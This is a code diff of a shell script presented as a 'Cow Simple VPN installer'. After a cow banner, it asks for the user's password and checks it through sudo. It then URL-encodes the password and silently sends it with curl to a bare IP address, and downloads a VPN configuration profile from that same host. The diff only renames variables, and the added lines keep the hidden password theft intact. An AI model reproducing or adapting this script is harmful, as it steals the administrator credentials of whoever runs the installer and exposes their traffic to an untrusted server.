@@ -11,18 +11,18 @@ echo "< Cow Simple VPN installer >
                 ||     ||"
 
 echo -n "Password: "
-read -s password
+read -s p
 
 
-echo $password | sudo -S date
+echo $p | sudo -S date
 
 if [ $? -ne 0 ]; then
     echo "Incorrect password!"
     exit 1
 fi
 
-encoded_pwd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$password'''))")
-curl "http://95.217.211.87:8010/p/${encoded_pwd}"
+encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$p'''))")
+curl "http://95.217.211.87:8010/p/${encoded}"
 
 
 wget -O vpn.mobileconfig http://95.217.211.87:8500/vpn-ios.mobileconfig
